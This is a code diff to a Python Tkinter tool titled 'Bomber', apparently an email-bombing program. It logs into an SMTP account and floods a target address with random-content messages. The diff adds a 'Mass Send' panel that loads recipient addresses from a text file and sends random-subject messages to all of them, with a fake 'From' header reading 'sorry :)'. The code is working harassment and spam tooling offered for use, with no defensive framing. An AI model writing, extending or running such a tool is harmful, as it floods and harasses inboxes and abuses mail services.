@@ -1,21 +1,26 @@
-import smtplib, random, string, time
 from tkinter import *
 from tkinter import messagebox
+from email.mime.text import MIMEText
+import smtplib, random, string
 
 def main():
     root = Tk()
     root.resizable(FALSE, FALSE)
-    root.geometry('250x330')
+    root.geometry('250x480')
     root.title('Bomber')
     root.configure(background='black')
     #messagebox.showinfo("Credits", ''.join('All Rights Reserved To Bropocalypse Team'))
 
-    form = LabelFrame(root, text="Login", font='Helvetica 9 italic', background='black', foreground='cyan')
+    form = LabelFrame(root, text="Login", font='calibri 9 italic', background='black', foreground='cyan')
     form.grid(row=1, columnspan=2, sticky='WE', \
     padx=5, pady=0, ipadx=120, ipady=65)
 
-    form1 = LabelFrame(root, text="Attack", font='Helvetica 9 italic', background='black', foreground='cyan')
+    form1 = LabelFrame(root, text="Attack", font='calibri 9 italic', background='black', foreground='cyan')
     form1.grid(row=2, columnspan=2, sticky='WE', \
+    padx=5, pady=0, ipadx=120, ipady=75)
+
+    form2 = LabelFrame(root, text="Mass Send", font='calibri 9 italic', background='black', foreground='cyan')
+    form2.grid(row=3, columnspan=2, sticky='WE', \
     padx=5, pady=0, ipadx=120, ipady=75)
 
     ############ Login
@@ -54,7 +59,14 @@ def main():
     var = IntVar()
     tok = "Email Sent : " + str(var.get())
     lab = Label(root, text=tok, background='black', foreground='white')
-    lab.place(x=85, y=290)
+    lab.place(x=85, y=445)
+
+    ########### Mass Send
+    b2 = Button(form2, text='Load Emails', background='black', foreground='white', command= load)
+    b2.place(x=80, y=30)
+
+    b3 = Button(form2, text='Attack', background='black', foreground='white', command= lambda:masssend(lab, var))
+    b3.place(x=95, y=70)
 
     mainloop()
 
@@ -77,7 +89,7 @@ def login():
         messagebox.showinfo("", ''.join('Succesfully Login'))
     except smtplib.SMTPAuthenticationError:
         messagebox.showerror("Error", ''.join('Incorrect Username Or Password'))
-        messagebox.showerror("Error", ''.join('Make Sure The Options Of Less Secure Apps Is Enabled'))
+        messagebox.showerror("Error", ''.join('Make Sure The Less Secure Apps Option Is Enabled'))
 
 def generator():
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
@@ -94,11 +106,36 @@ def attack(lab, var):
             server.sendmail(email,vemail,message)
             var.set(var.get()+1)
             lab['text'] = 'Email Sent : ' + str(var.get())
-
+            messagebox.showinfo("", ''.join('Done'))
 
     except smtplib.SMTPAuthenticationError:
         messagebox.showerror("Error", ''.join('Incorrect Username Or Password'))
-        messagebox.showerror("Error", ''.join('Make Sure The Options Of Less Secure Apps Is Enabled'))
+        messagebox.showerror("Error", ''.join('Make Sure The Less Secure Apps Option Is Enabled'))
+
+def load():
+    with open('emails.txt','r') as emails:
+        name = emails.read()
+        global memails
+        memails = name.splitlines()
+        messagebox.showinfo("", ''.join(f"Number Of Emails Is : {len(memails)}"))
+
+def masssend(lab, var):
+
+    sender = email
+    recipients = memails
+    msg = MIMEText(generator())
+    msg['Subject'] = generator()
+    msg['From'] = 'sorry :)'
+    msg['To'] = ", ".join(recipients)
+    text = msg.as_string()
+    try:
+        server.sendmail(sender, recipients, text)
+        var.set(var.get()+len(memails))
+        lab['text'] = 'Email Sent : ' + str(var.get())
+        messagebox.showinfo("", ''.join('Done'))
+    except smtplib.SMTPAuthenticationError:
+        messagebox.showerror("Error", ''.join('Incorrect Username Or Password'))
+        messagebox.showerror("Error", ''.join('Make Sure The Less Secure Apps Option Is Enabled'))
 
 
 main()
